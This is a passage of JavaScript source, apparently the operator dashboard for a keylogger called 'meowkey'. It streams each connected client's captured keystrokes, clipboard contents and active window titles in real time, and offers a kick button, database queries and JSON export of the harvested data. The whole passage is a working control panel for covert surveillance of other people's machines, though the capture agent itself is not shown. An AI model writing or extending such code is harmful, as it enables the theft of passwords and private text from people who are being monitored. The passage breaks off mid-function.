            this.utils.showNotification('Failed to load dashboard data', 'error');
        }
    }

    // Initialize last timestamps for each client
    initializeLastTimestamps(allClientsData) {
        if (!allClientsData.success || !allClientsData.allClients) return;
        
        allClientsData.allClients.forEach(client => {
            // For each client, we'll track the latest event timestamps
            this.lastEventTimestamps.set(client.id, {
                lastKeystroke: 0,
                lastClipboard: 0,
                lastWindow: 0
            });
        });
    }

    // Update dashboard with real data
    updateDashboardData(listData, allClientsData, statsData) {
        console.log('ðŸ”„ Updating dashboard with real data');
        
        // Clear current clients
        this.activeClients.clear();
        const container = document.getElementById('clients-container');
        if (container) {
            const emptyState = container.querySelector('.empty-state');
            if (emptyState) emptyState.remove();
        }
        
        // Process active clients
        if (listData.success && listData.active) {
            listData.active.forEach(client => {
                this.addClientCard({
                    id: client.id,
                    status: 'active',
                    connectedAt: client.connectedAt || Date.now()
                });
            });
        }
        
        // Update stats
        this.updateStats(allClientsData, statsData);
        
        // If no active clients, show empty state
        if (this.activeClients.size === 0) {
            this.showEmptyState();
        }
    }

    // Add client card to dashboard
    async addClientCard(client) {
        if (this.activeClients.has(client.id)) {
            this.updateClientCard(client.id, client);
            return;
        }

        console.log(`âž• Adding LIVE client card: ${client.id}`);
        
        // Store client with empty buffers for live data
        this.activeClients.set(client.id, {
            ...client,
            keystrokes: [],
            clipboard: [],
            windows: [],
            // For live updates
            lastKeystrokeTime: 0,
            lastClipboardTime: 0,
            lastWindowTime: 0
        });

        // Initialize pending events buffer
        this.pendingLiveEvents.set(client.id, {
            keystrokes: [],
            clipboard: [],
            windows: []
        });

        const container = document.getElementById('clients-container');
        if (!container) return;
        
        // Remove empty state if present
        const emptyState = container.querySelector('.empty-state');
        if (emptyState) {
            emptyState.remove();
        }

        // Create card
        const card = this.createClientCard(client);
        container.appendChild(card);
        
        // Load initial historical data
        this.loadClientHistoricalData(client.id);
        
        // Start live monitoring for this client
        this.startClientLiveMonitoring(client.id);
    }

    // Create client card HTML with live indicators
    createClientCard(client) {
        const card = document.createElement('div');
        card.className = 'client-card';
        card.id = `client-${client.id}`;
        
        card.innerHTML = `
            <div class="client-header">
                <div class="client-info">
                    <div class="client-avatar" style="background: ${this.utils.getClientColor(client.id)}">
                        ${this.utils.getClientInitials(client.id)}
                    </div>
                    <div class="client-details">
                        <h3>${client.id}</h3>
                        <p>Connected ${this.utils.formatTimestamp(client.connectedAt || Date.now())}</p>
                        <div class="live-indicator">
                            <span class="live-dot"></span>
                            <span class="live-text">LIVE</span>
                        </div>
                    </div>
                </div>
                <div class="client-status">
                    <div class="connection-indicator">
                        <span class="connection-dot connected"></span>
                        <span>Active</span>
                    </div>
                    <button class="btn-danger disconnect-btn" data-client-id="${client.id}">
                        <i class="fas fa-sign-out-alt"></i> Disconnect
                    </button>
                    <button class="btn-secondary view-data-btn" data-client-id="${client.id}">
                        <i class="fas fa-eye"></i> View Data
                    </button>
                </div>
            </div>
            <div class="client-content">
                <div class="keystrokes-section">
                    <div class="section-header">
                        <h4>Live Keystrokes</h4>
                        <span class="live-counter" id="keystroke-counter-${client.id}">0</span>
                    </div>
                    <div class="keystrokes-display live-stream" id="keystrokes-${client.id}">
                        <div class="live-placeholder">Waiting for keystrokes...</div>
                    </div>
                </div>
                <div class="windows-section">
                    <div class="section-header">
                        <h4>Window Focus</h4>
                        <span class="live-counter" id="window-counter-${client.id}">0</span>
                    </div>
                    <div class="windows-list live-stream" id="windows-${client.id}">
                        <div class="live-placeholder">No window changes yet</div>
                    </div>
                </div>
                <div class="clipboard-section">
                    <div class="section-header">
                        <h4>Clipboard Changes</h4>
                        <span class="live-counter" id="clipboard-counter-${client.id}">0</span>
                    </div>
                    <div class="clipboard-buttons live-stream" id="clipboard-${client.id}">
                        <div class="live-placeholder">No clipboard changes yet</div>
                    </div>
                </div>
            </div>
        `;

        // Add event listeners
        const disconnectBtn = card.querySelector('.disconnect-btn');
        if (disconnectBtn) {
            disconnectBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                this.disconnectClient(client.id);
            });
        }

        const viewDataBtn = card.querySelector('.view-data-btn');
        if (viewDataBtn) {
            viewDataBtn.addEventListener('click', (e) => {
                e.stopPropagation();
                this.showClientDataModal(client.id);
            });
        }

        return card;
    }

    // Load historical data for a client
    async loadClientHistoricalData(clientId) {
        try {
            console.log(`ðŸ“Š Loading historical data for client: ${clientId}`);
            
            // Load all data types
            const response = await this.utils.apiCall(`/api/clients/${clientId}/data?type=all`);
            
            if (response.success) {
                // Update buffers with historical data
                this.updateClientBuffers(clientId, response);
                
                // Set last timestamps
                const client = this.activeClients.get(clientId);
                if (client) {
                    if (response.keystrokes && response.keystrokes.length > 0) {
                        const lastKeystroke = response.keystrokes[response.keystrokes.length - 1];
                        client.lastKeystrokeTime = lastKeystroke.timestamp || 0;
                    }
                    if (response.clipboard && response.clipboard.length > 0) {
                        const lastClipboard = response.clipboard[response.clipboard.length - 1];
                        client.lastClipboardTime = lastClipboard.timestamp || 0;
                    }
                    if (response.windows && response.windows.length > 0) {
                        const lastWindow = response.windows[response.windows.length - 1];
                        client.lastWindowTime = lastWindow.timestamp || 0;
                    }
                    this.activeClients.set(clientId, client);
                }
            }
        } catch (error) {
            console.error(`Failed to load historical data for ${clientId}:`, error);
        }
    }

    // Start live monitoring for a client
    startClientLiveMonitoring(clientId) {
        console.log(`ðŸ” Starting live monitoring for ${clientId}`);
        
        // Set up periodic checks for new events
        const monitorInterval = setInterval(async () => {
            if (!this.activeClients.has(clientId)) {
                clearInterval(monitorInterval);
                return;
            }
            
            await this.checkForNewEvents(clientId);
        }, this.liveUpdateInterval);
        
        // Store interval for cleanup
        const client = this.activeClients.get(clientId);
        if (client) {
            client.monitorInterval = monitorInterval;
            this.activeClients.set(clientId, client);
        }
    }

    // Check for new events
    async checkForNewEvents(clientId) {
        try {
            const client = this.activeClients.get(clientId);
            if (!client) return;
            
            // Check for new keystrokes
            await this.checkNewKeystrokes(clientId, client.lastKeystrokeTime);
            
            // Check for new clipboard events
            await this.checkNewClipboard(clientId, client.lastClipboardTime);
            
            // Check for new window events
            await this.checkNewWindows(clientId, client.lastWindowTime);
            
        } catch (error) {
            console.error(`Error checking new events for ${clientId}:`, error);
        }
    }

    // Check for new keystrokes
    async checkNewKeystrokes(clientId, lastTimestamp) {
        try {
            // Query for keystrokes after last timestamp
            const response = await this.utils.apiCall(`/api/clients/${clientId}/data?type=keystrokes`);
            
            if (response.success && response.keystrokes) {
                const newKeystrokes = response.keystrokes.filter(ks => 
                    ks.timestamp > lastTimestamp
                );
                
                if (newKeystrokes.length > 0) {
                    // Add to pending buffer
                    const pending = this.pendingLiveEvents.get(clientId);
                    if (pending) {
                        pending.keystrokes.push(...newKeystrokes);
                        this.pendingLiveEvents.set(clientId, pending);
                    }
                    
                    // Update last timestamp
                    const client = this.activeClients.get(clientId);
                    if (client) {
                        client.lastKeystrokeTime = newKeystrokes[newKeystrokes.length - 1].timestamp;
                        this.activeClients.set(clientId, client);
                    }
                }
            }
        } catch (error) {
            // Silently fail - individual type queries might fail, we'll handle in processLiveEvents
        }
    }

    // Check for new clipboard events
    async checkNewClipboard(clientId, lastTimestamp) {
        try {
            const response = await this.utils.apiCall(`/api/clients/${clientId}/data?type=clipboard`);
            
            if (response.success && response.clipboard) {
                const newClipboard = response.clipboard.filter(cb => 
                    cb.timestamp > lastTimestamp
                );
                
                if (newClipboard.length > 0) {
                    const pending = this.pendingLiveEvents.get(clientId);
                    if (pending) {
                        pending.clipboard.push(...newClipboard);
                        this.pendingLiveEvents.set(clientId, pending);
                    }
                    
                    const client = this.activeClients.get(clientId);
                    if (client) {
                        client.lastClipboardTime = newClipboard[newClipboard.length - 1].timestamp;
                        this.activeClients.set(clientId, client);
                    }
                }
            }
        } catch (error) {
            // Silently fail
        }
    }

    // Check for new window events
    async checkNewWindows(clientId, lastTimestamp) {
        try {
            const response = await this.utils.apiCall(`/api/clients/${clientId}/data?type=windows`);
            
            if (response.success && response.windows) {
                const newWindows = response.windows.filter(win => 
                    win.timestamp > lastTimestamp
                );
                
                if (newWindows.length > 0) {
                    const pending = this.pendingLiveEvents.get(clientId);
                    if (pending) {
                        pending.windows.push(...newWindows);
                        this.pendingLiveEvents.set(clientId, pending);
                    }
                    
                    const client = this.activeClients.get(clientId);
                    if (client) {
                        client.lastWindowTime = newWindows[newWindows.length - 1].timestamp;
                        this.activeClients.set(clientId, client);
                    }
                }
            }
        } catch (error) {
            // Silently fail
        }
    }

    // Update client buffers with data
    updateClientBuffers(clientId, data) {
        const client = this.activeClients.get(clientId);
        if (!client) return;
        
        // Update keystrokes buffer
        if (data.keystrokes && data.keystrokes.length > 0) {
            // Add new keystrokes to beginning of array (most recent first)
            const newKeystrokes = data.keystrokes.slice().reverse(); // Reverse to get newest first
            client.keystrokes = [...newKeystrokes, ...client.keystrokes].slice(0, this.maxKeystrokes);
        }
        
        // Update clipboard buffer
        if (data.clipboard && data.clipboard.length > 0) {
            const newClipboard = data.clipboard.slice().reverse();
            client.clipboard = [...newClipboard, ...client.clipboard].slice(0, this.maxClipboard);
        }
        
        // Update windows buffer
        if (data.windows && data.windows.length > 0) {
            const newWindows = data.windows.slice().reverse();
            client.windows = [...newWindows, ...client.windows].slice(0, this.maxWindows);
        }
        
        this.activeClients.set(clientId, client);
        
        // Update display
        this.updateClientDisplay(clientId);
    }

    // Update client display
    updateClientDisplay(clientId) {
        const client = this.activeClients.get(clientId);
        if (!client) return;
        
        // Update keystrokes display
        this.updateKeystrokesDisplay(clientId, client.keystrokes);
        
        // Update clipboard display
        this.updateClipboardDisplay(clientId, client.clipboard);
        
        // Update windows display
        this.updateWindowsDisplay(clientId, client.windows);
        
        // Update counters
        this.updateLiveCounters(clientId);
    }

    // Process pending live events
    processLiveEvents() {
        this.pendingLiveEvents.forEach((pending, clientId) => {
            if (pending.keystrokes.length > 0 || 
                pending.clipboard.length > 0 || 
                pending.windows.length > 0) {
                
                // Process keystrokes
                if (pending.keystrokes.length > 0) {
                    this.processNewKeystrokes(clientId, pending.keystrokes);
                    pending.keystrokes = [];
                }
                
                // Process clipboard
                if (pending.clipboard.length > 0) {
                    this.processNewClipboard(clientId, pending.clipboard);
                    pending.clipboard = [];
                }
                
                // Process windows
                if (pending.windows.length > 0) {
                    this.processNewWindows(clientId, pending.windows);
                    pending.windows = [];
                }
                
                this.pendingLiveEvents.set(clientId, pending);
            }
        });
    }

    // Process new keystrokes with animation
    processNewKeystrokes(clientId, newKeystrokes) {
        const client = this.activeClients.get(clientId);
        if (!client) return;
        
        // Add to buffer (newest first)
        const reversedKeystrokes = newKeystrokes.slice().reverse();
        client.keystrokes = [...reversedKeystrokes, ...client.keystrokes].slice(0, this.maxKeystrokes);
        this.activeClients.set(clientId, client);
        
        // Update display with animation
        this.animateNewKeystrokes(clientId, reversedKeystrokes);
    }

    // Animate new keystrokes
    animateNewKeystrokes(clientId, newKeystrokes) {
        const container = document.getElementById(`keystrokes-${clientId}`);
        if (!container) return;
        
        // Remove placeholder if present
        const placeholder = container.querySelector('.live-placeholder');
        if (placeholder) {
            placeholder.remove();
        }
        
        // Add new keystrokes with animation
        newKeystrokes.forEach((keystroke, index) => {
            const element = this.createKeystrokeElement(keystroke);
            element.classList.add('new-keystroke');
            container.insertBefore(element, container.firstChild);
            
            // Remove animation class after animation completes
            setTimeout(() => {
                element.classList.remove('new-keystroke');
            }, 500);
        });
        
        // Limit displayed keystrokes
        while (container.children.length > this.maxKeystrokes) {
            container.removeChild(container.lastChild);
        }
        
        // Update counter
        this.updateKeystrokeCounter(clientId);
    }

    // Create keystroke element
    createKeystrokeElement(keystroke) {
        const element = document.createElement('span');
        element.className = `keystroke ${this.utils.classifyKeystroke(keystroke.key)}`;
        element.textContent = keystroke.key || 'Unknown';
        element.title = `Time: ${keystroke.displayTime || this.utils.formatMicroTimestamp(keystroke.timestamp)}`;
        return element;
    }

    // Process new clipboard events
    processNewClipboard(clientId, newClipboard) {
        const client = this.activeClients.get(clientId);
        if (!client) return;
        
        const reversedClipboard = newClipboard.slice().reverse();
        client.clipboard = [...reversedClipboard, ...client.clipboard].slice(0, this.maxClipboard);
        this.activeClients.set(clientId, client);
        
        this.updateClipboardDisplay(clientId, client.clipboard);
        this.updateClipboardCounter(clientId);
    }

    // Process new window events
    processNewWindows(clientId, newWindows) {
        const client = this.activeClients.get(clientId);
        if (!client) return;
        
        const reversedWindows = newWindows.slice().reverse();
        client.windows = [...reversedWindows, ...client.windows].slice(0, this.maxWindows);
        this.activeClients.set(clientId, client);
        
        this.updateWindowsDisplay(clientId, client.windows);
        this.updateWindowCounter(clientId);
    }

    // Update keystrokes display
    updateKeystrokesDisplay(clientId, keystrokes) {
        const container = document.getElementById(`keystrokes-${clientId}`);
        if (!container) return;
        
        container.innerHTML = '';
        
        if (!keystrokes || keystrokes.length === 0) {
            container.innerHTML = '<div class="live-placeholder">Waiting for keystrokes...</div>';
            return;
        }
        
        // Display most recent keystrokes (they're already in reverse order in buffer)
        keystrokes.forEach(keystroke => {
            const element = this.createKeystrokeElement(keystroke);
            container.appendChild(element);
        });
    }

    // Update clipboard display
    updateClipboardDisplay(clientId, clipboard) {
        const container = document.getElementById(`clipboard-${clientId}`);
        if (!container) return;
        
        container.innerHTML = '';
        
        if (!clipboard || clipboard.length === 0) {
            container.innerHTML = '<div class="live-placeholder">No clipboard changes yet</div>';
            return;
        }
        
        // Remove placeholder
        const placeholder = container.querySelector('.live-placeholder');
        if (placeholder) placeholder.remove();
        
        clipboard.forEach((item, index) => {
            const button = this.createClipboardButton(clientId, item, index);
            container.appendChild(button);
        });
    }

    // Create clipboard button
    createClipboardButton(clientId, item, index) {
        const button = document.createElement('button');
        button.className = 'clipboard-button';
        button.dataset.clientId = clientId;
        button.dataset.index = index;
        
        const displayContent = item.content 
            ? (item.content.length > 50 ? item.content.substring(0, 50) + '...' : item.content)
            : 'Empty';
        
        button.innerHTML = `
            <span>${displayContent}</span>
            <span class="clipboard-time">${item.displayTime || this.utils.formatMicroTimestamp(item.timestamp)}</span>
        `;
        
        button.addEventListener('click', (e) => {
            e.stopPropagation();
            this.showClipboardContent(clientId, item.content, item.timestamp);
        });
        
        return button;
    }

    // Update windows display
    updateWindowsDisplay(clientId, windows) {
        const container = document.getElementById(`windows-${clientId}`);
        if (!container) return;
        
        container.innerHTML = '';
        
        if (!windows || windows.length === 0) {
            container.innerHTML = '<div class="live-placeholder">No window changes yet</div>';
            return;
        }
        
        // Remove placeholder
        const placeholder = container.querySelector('.live-placeholder');
        if (placeholder) placeholder.remove();
        
        windows.forEach(item => {
            const element = this.createWindowElement(item);
            container.appendChild(element);
        });
    }

    // Create window element
    createWindowElement(item) {
        const element = document.createElement('div');
        element.className = 'window-item';
        element.innerHTML = `
            <div class="window-title" title="${item.title || 'Unknown'}">${item.title || 'Unknown'}</div>
            <div class="window-process">${item.process || 'Unknown'}</div>
        `;
        return element;
    }

    // Update live counters
    updateLiveCounters(clientId) {
        this.updateKeystrokeCounter(clientId);
        this.updateClipboardCounter(clientId);
        this.updateWindowCounter(clientId);
    }

    updateKeystrokeCounter(clientId) {
        const counter = document.getElementById(`keystroke-counter-${clientId}`);
        if (counter) {
            const client = this.activeClients.get(clientId);
            const count = client?.keystrokes?.length || 0;
            counter.textContent = count;
        }
    }

    updateClipboardCounter(clientId) {
        const counter = document.getElementById(`clipboard-counter-${clientId}`);
        if (counter) {
            const client = this.activeClients.get(clientId);
            const count = client?.clipboard?.length || 0;
            counter.textContent = count;
        }
    }

    updateWindowCounter(clientId) {
        const counter = document.getElementById(`window-counter-${clientId}`);
        if (counter) {
            const client = this.activeClients.get(clientId);
            const count = client?.windows?.length || 0;
            counter.textContent = count;
        }
    }

    // Start live updates processing
    startLiveUpdates() {
        this.liveUpdates = setInterval(() => {
            this.processLiveEvents();
        }, 300); // Process events every 300ms
    }

    // Stop live updates
    stopLiveUpdates() {
        if (this.liveUpdates) {
            clearInterval(this.liveUpdates);
            this.liveUpdates = null;
        }
    }

    // Show clipboard content in modal
    showClipboardContent(clientId, content, timestamp) {
        document.getElementById('clipboard-client-id').textContent = `Client: ${clientId}`;
        document.getElementById('clipboard-timestamp').textContent = this.utils.formatMicroTimestamp(timestamp);
        document.getElementById('clipboard-content').textContent = content || 'Empty';
        
        this.utils.showModal('clipboard-modal');
    }

    // Update existing client card
    updateClientCard(clientId, clientData) {
        const card = document.getElementById(`client-${clientId}`);
        if (!card) return;

        const details = card.querySelector('.client-details p');
        if (details) {
            details.textContent = `Connected ${this.utils.formatTimestamp(clientData.connectedAt || Date.now())}`;
        }

        const connectionDot = card.querySelector('.connection-dot');
        if (connectionDot) {
            connectionDot.classList.toggle('connected', clientData.status === 'active');
        }
    }

    // Remove client card
    removeClientCard(clientId) {
        const card = document.getElementById(`client-${clientId}`);
        if (card) {
            card.remove();
        }

        this.activeClients.delete(clientId);
        this.pendingLiveEvents.delete(clientId);
        this.updateStats();

        // Show empty state if no clients
        if (this.activeClients.size === 0) {
            this.showEmptyState();
        }
    }

    // Show empty state
    showEmptyState() {
        const container = document.getElementById('clients-container');
        if (container) {
            container.innerHTML = `
                <div class="empty-state">
                    <i class="fas fa-user-slash"></i>
                    <h3>No Active Clients</h3>
                    <p>Clients will appear here once connected and approved</p>
                </div>
            `;
        }
    }

    // Disconnect client
    async disconnectClient(clientId) {
        if (!confirm(`Are you sure you want to disconnect ${clientId}?`)) {
            return;
        }

        try {
            const response = await this.utils.apiCall(`/api/clients/${clientId}/kick`, 'POST');
            
            if (response.success) {
                this.utils.showNotification(`Client ${clientId} disconnected`, 'success');
                this.removeClientCard(clientId);
            } else {
                this.utils.showNotification(`Failed to disconnect ${clientId}: ${response.error}`, 'error');
            }
        } catch (error) {
            console.error('Failed to disconnect client:', error);
            this.utils.showNotification('Failed to disconnect client', 'error');
        }
    }

    // Update dashboard statistics
    async updateStats(allClientsData = null, statsData = null) {
        try {
            // If data not provided, fetch it
            if (!allClientsData) {
                allClientsData = await this.utils.apiCall('/api/clients/all');
            }
            
            if (!statsData) {
                statsData = await this.utils.apiCall('/api/stats');
            }
            
            // Update total clients (active + pending)
            const listResponse = await this.utils.apiCall('/api/clients/list');
            const totalActive = listResponse.active?.length || 0;
            const totalPending = listResponse.pending?.length || 0;
            const totalClients = totalActive + totalPending;
            
            // Calculate total events from all clients
            let totalKeystrokes = 0;
            let totalClipboard = 0;
            
            if (allClientsData.success && allClientsData.allClients) {
                allClientsData.allClients.forEach(client => {
                    totalKeystrokes += client.keystrokes || 0;
                    totalClipboard += client.clipboard || 0;
                });
            }
            
            // Update UI
            const totalClientsEl = document.getElementById('total-clients');
            const totalKeystrokesEl = document.getElementById('total-keystrokes');
            const totalClipboardEl = document.getElementById('total-clipboard');
            
            if (totalClientsEl) totalClientsEl.textContent = totalClients;
            if (totalKeystrokesEl) totalKeystrokesEl.textContent = totalKeystrokes.toLocaleString();
            if (totalClipboardEl) totalClipboardEl.textContent = totalClipboard.toLocaleString();
            
            // Update server status
            const statusDot = document.querySelector('.status-dot');
            const statusText = document.querySelector('.status-text');
            if (statusDot && statusText) {
                statusDot.classList.add('active');
                statusText.textContent = 'Server: Online';
            }
            
        } catch (error) {
            console.error('Failed to update stats:', error);
            
            // Update server status to offline
            const statusDot = document.querySelector('.status-dot');
            const statusText = document.querySelector('.status-text');
            if (statusDot && statusText) {
                statusDot.classList.remove('active');
                statusText.textContent = 'Server: Offline';
            }
        }
    }

    // Start auto-refresh
    startAutoRefresh() {
        // Clear any existing interval
        if (this.autoRefresh) {
            clearInterval(this.autoRefresh);
        }
        
        // Start new interval
        this.autoRefresh = setInterval(async () => {
            try {
                console.log('ðŸ”„ Auto-refreshing dashboard...');
                
                // Get updated client list
                const listResponse = await this.utils.apiCall('/api/clients/list');
                
                // Update active clients
                const currentClientIds = Array.from(this.activeClients.keys());
                const newActiveClients = listResponse.active || [];
                
                // Remove clients that are no longer active
                currentClientIds.forEach(clientId => {
                    const stillActive = newActiveClients.some(client => client.id === clientId);
                    if (!stillActive) {
                        this.removeClientCard(clientId);
                    }
                });
                
                // Add new active clients
                newActiveClients.forEach(client => {
                    if (!this.activeClients.has(client.id)) {
                        this.addClientCard(client);
                    }
                });
                
                // Update stats
                this.updateStats();
                
            } catch (error) {
                console.error('Auto-refresh failed:', error);
            }
        }, this.refreshInterval);
        
        console.log(`âœ… Auto-refresh started (every ${this.refreshInterval / 1000}s)`);
    }

    // Stop auto-refresh
    stopAutoRefresh() {
        if (this.autoRefresh) {
            clearInterval(this.autoRefresh);
            this.autoRefresh = null;
            console.log('â¹ï¸ Auto-refresh stopped');
        }
    }

    // Show client data modal with detailed view
    async showClientDataModal(clientId) {
        try {
            this.utils.showNotification(`Loading data for ${clientId}...`, 'info');
            
            const response = await this.utils.apiCall(`/api/clients/${clientId}/data?type=all`);
            
            if (response.success) {
                this.createClientDataModal(clientId, response);
            } else {
                this.utils.showNotification(`Failed to load data for ${clientId}`, 'error');
            }
        } catch (error) {
            console.error(`Failed to show client data for ${clientId}:`, error);
            this.utils.showNotification('Failed to load client data', 'error');
        }
    }

    // Create client data modal
    createClientDataModal(clientId, data) {
        // Remove existing modal if any
        const existingModal = document.getElementById('client-data-modal');
        if (existingModal) {
            existingModal.remove();
        }
        
        // Create modal
        const modal = document.createElement('div');
        modal.className = 'modal';
        modal.id = 'client-data-modal';
        
        // Prepare data for display
        const keystrokesCount = data.keystrokes?.length || 0;
        const clipboardCount = data.clipboard?.length || 0;
        const windowsCount = data.windows?.length || 0;
        
        modal.innerHTML = `
            <div class="modal-content" style="max-width: 800px;">
                <div class="modal-header">
                    <h3><i class="fas fa-user"></i> Client Data: ${clientId}</h3>
                    <button class="close-modal">&times;</button>
                </div>
                <div class="modal-body">
                    <div class="data-summary">
                        <div class="summary-item">
                            <i class="fas fa-keyboard"></i>
                            <span>Keystrokes: ${keystrokesCount}</span>
                        </div>
                        <div class="summary-item">
                            <i class="fas fa-clipboard"></i>
                            <span>Clipboard: ${clipboardCount}</span>
                        </div>
                        <div class="summary-item">
                            <i class="fas fa-window-maximize"></i>
                            <span>Windows: ${windowsCount}</span>
                        </div>
                    </div>
                    
                    <div class="data-tabs">
                        <button class="tab-btn active" data-tab="keystrokes">Keystrokes</button>
                        <button class="tab-btn" data-tab="clipboard">Clipboard</button>
                        <button class="tab-btn" data-tab="windows">Windows</button>
                    </div>
                    
                    <div class="tab-content" id="keystrokes-tab">
                        ${this.formatKeystrokesForModal(data.keystrokes || [])}
                    </div>
                    
                    <div class="tab-content" id="clipboard-tab" style="display: none;">
                        ${this.formatClipboardForModal(data.clipboard || [])}
                    </div>
                    
                    <div class="tab-content" id="windows-tab" style="display: none;">
                        ${this.formatWindowsForModal(data.windows || [])}
                    </div>
                </div>
                <div class="modal-footer">
                    <button class="btn-secondary" id="export-data-btn">
                        <i class="fas fa-download"></i> Export Data
                    </button>
                    <button class="btn-secondary close-modal">Close</button>
                </div>
            </div>
        `;
        
        document.body.appendChild(modal);
        this.utils.showModal('client-data-modal');
        
        // Setup tab switching
        this.setupDataModalTabs();
        
        // Setup export button
        const exportBtn = document.getElementById('export-data-btn');
        if (exportBtn) {
            exportBtn.addEventListener('click', () => {
                this.exportClientData(clientId, data);
            });
        }
        
        // Setup close handlers
        modal.querySelectorAll('.close-modal').forEach(btn => {
            btn.addEventListener('click', () => {
                this.utils.hideModal('client-data-modal');
                setTimeout(() => {
                    if (modal.parentNode) {
                        modal.remove();
                    }
                }, 300);
            });
        });
    }

    // Format keystrokes for modal display
    formatKeystrokesForModal(keystrokes) {
        if (!keystrokes.length) {
            return '<div class="no-data">No keystrokes recorded</div>';
        }
        
        let html = '<div class="data-list">';
        keystrokes.forEach((item, index) => {
            const time = item.displayTime || this.utils.formatMicroTimestamp(item.timestamp);
            html += `
                <div class="data-item">
                    <span class="data-index">${index + 1}.</span>
                    <span class="data-time">[${time}]</span>
                    <span class="data-content keystroke ${this.utils.classifyKeystroke(item.key)}">${item.key || 'Unknown'}</span>
                </div>
            `;
        });
        html += '</div>';
        return html;
    }

    // Format clipboard for modal display
    formatClipboardForModal(clipboard) {
        if (!clipboard.length) {
            return '<div class="no-data">No clipboard events</div>';
        }
        
        let html = '<div class="data-list">';
        clipboard.forEach((item, index) => {
            const time = item.displayTime || this.utils.formatMicroTimestamp(item.timestamp);
            const content = item.content || 'Empty';
            html += `
                <div class="data-item clipboard-item">
                    <span class="data-index">${index + 1}.</span>
                    <span class="data-time">[${time}]</span>
                    <div class="data-content">${this.escapeHtml(content)}</div>
                </div>
            `;
        });
        html += '</div>';
        return html;
    }

    // Format windows for modal display
    formatWindowsForModal(windows) {
        if (!windows.length) {
            return '<div class="no-data">No window events</div>';
        }
        
        let html = '<div class="data-list">';
        windows.forEach((item, index) => {
            const time = item.displayTime || this.utils.formatMicroTimestamp(item.timestamp);
            html += `
                <div class="data-item window-item">
                    <span class="data-index">${index + 1}.</span>
                    <span class="data-time">[${time}]</span>
                    <div class="data-content">
                        <div class="window-title">${this.escapeHtml(item.title || 'Unknown')}</div>
                        <div class="window-process">${this.escapeHtml(item.process || 'Unknown')}</div>
                    </div>
                </div>
            `;
        });
        html += '</div>';
        return html;
    }

    // Setup data modal tabs
    setupDataModalTabs() {
        const tabBtns = document.querySelectorAll('.tab-btn');
        const tabContents = document.querySelectorAll('.tab-content');
        
        tabBtns.forEach(btn => {
            btn.addEventListener('click', () => {
                // Remove active class from all tabs
                tabBtns.forEach(b => b.classList.remove('active'));
                tabContents.forEach(c => c.style.display = 'none');
                
                // Activate clicked tab
                btn.classList.add('active');
                const tabId = btn.dataset.tab + '-tab';
                const tabContent = document.getElementById(tabId);
                if (tabContent) {
                    tabContent.style.display = 'block';
                }
            });
        });
    }

    // Export client data
    exportClientData(clientId, data) {
        const exportData = {
            clientId: clientId,
            exportTime: new Date().toISOString(),
            keystrokes: data.keystrokes || [],
            clipboard: data.clipboard || [],
            windows: data.windows || []
        };
        
        const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `meowkey-client-${clientId}-${Date.now()}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        this.utils.showNotification(`Data exported for ${clientId}`, 'success');
    }

    // Setup query section for database queries
    setupQuerySection() {
        // Add query section to dashboard if not exists
        const mainContent = document.querySelector('.main-content');
        if (!mainContent || document.getElementById('query-section')) return;
        
        const querySection = document.createElement('div');
        querySection.id = 'query-section';
        querySection.className = 'dashboard-section';
        querySection.innerHTML = `
            <h2><i class="fas fa-database"></i> Database Query</h2>
            <div class="query-form">
                <div class="form-group">
                    <label for="query-client-select">Select Client:</label>
                    <select id="query-client-select">
                        <option value="">Loading clients...</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="query-data-type">Data Type:</label>
                    <select id="query-data-type">
                        <option value="all">All Data</option>
                        <option value="keystrokes">Keystrokes Only</option>
                        <option value="clipboard">Clipboard Only</option>
                        <option value="windows">Windows Only</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="query-limit">Limit:</label>
                    <input type="number" id="query-limit" value="100" min="1" max="1000">
                </div>
                <button class="btn-secondary" id="execute-query-btn">
                    <i class="fas fa-search"></i> Query Database
                </button>
                <button class="btn-secondary" id="refresh-clients-btn">
                    <i class="fas fa-sync-alt"></i> Refresh Client List
                </button>
            </div>
            <div class="query-results" id="query-results">
                <div class="empty-results">
                    <i class="fas fa-search"></i>
                    <p>Execute a query to see results</p>
                </div>
            </div>
        `;
        
        mainContent.appendChild(querySection);
        
        // Load clients into dropdown
        this.loadClientsForQuery();
        
        // Setup query button
        const queryBtn = document.getElementById('execute-query-btn');
        if (queryBtn) {
            queryBtn.addEventListener('click', () => this.executeDatabaseQuery());
        }
        
        // Setup refresh button
        const refreshBtn = document.getElementById('refresh-clients-btn');
        if (refreshBtn) {
            refreshBtn.addEventListener('click', () => this.loadClientsForQuery());
        }
    }

    // Load clients for query dropdown
    async loadClientsForQuery() {
        const select = document.getElementById('query-client-select');
        if (!select) return;
        
        try {
            const response = await this.utils.apiCall('/api/clients/all');
            
            if (response.success && response.allClients) {
                select.innerHTML = '<option value="">Select a client...</option>';
                response.allClients.forEach(client => {
                    const option = document.createElement('option');
                    option.value = client.id;
                    option.textContent = `${client.id} (KS:${client.keystrokes || 0}, CB:${client.clipboard || 0}, W:${client.windows || 0})`;
                    select.appendChild(option);
                });
            }
        } catch (error) {
            console.error('Failed to load clients for query:', error);
            select.innerHTML = '<option value="">Error loading clients</option>';
        }
    }

    // Execute database query - FIXED FOR INDIVIDUAL DATA TYPES
    async executeDatabaseQuery() {
        const clientId = document.getElementById('query-client-select').value;
        const dataType = document.getElementById('query-data-type').value;
        const limit = parseInt(document.getElementById('query-limit').value) || 100;
        
        if (!clientId) {
            this.utils.showNotification('Please select a client', 'error');
            return;
        }
        
        try {
            this.utils.showNotification(`Querying ${dataType} for ${clientId}...`, 'info');
            
            // Map frontend types to backend API types
            const typeMap = {
                'keystrokes': 'ks',
                'clipboard': 'clip',
                'windows': 'win',
                'all': 'all'
            };
            
            const apiType = typeMap[dataType] || 'all';
            const response = await this.utils.apiCall(`/api/clients/${clientId}/data?type=${apiType}`);
            
            if (response.success) {
                // Process response to ensure consistent structure
                const processedResponse = this.processQueryResponse(dataType, response);
                this.displayQueryResults(clientId, dataType, processedResponse);
            } else {
                this.utils.showNotification('Query failed: ' + (response.error || 'Unknown error'), 'error');
            }
        } catch (error) {
            console.error('Database query failed:', error);
            this.utils.showNotification('Query failed: ' + error.message, 'error');
        }
    }

    // Process query response to ensure consistent structure
    processQueryResponse(dataType, response) {
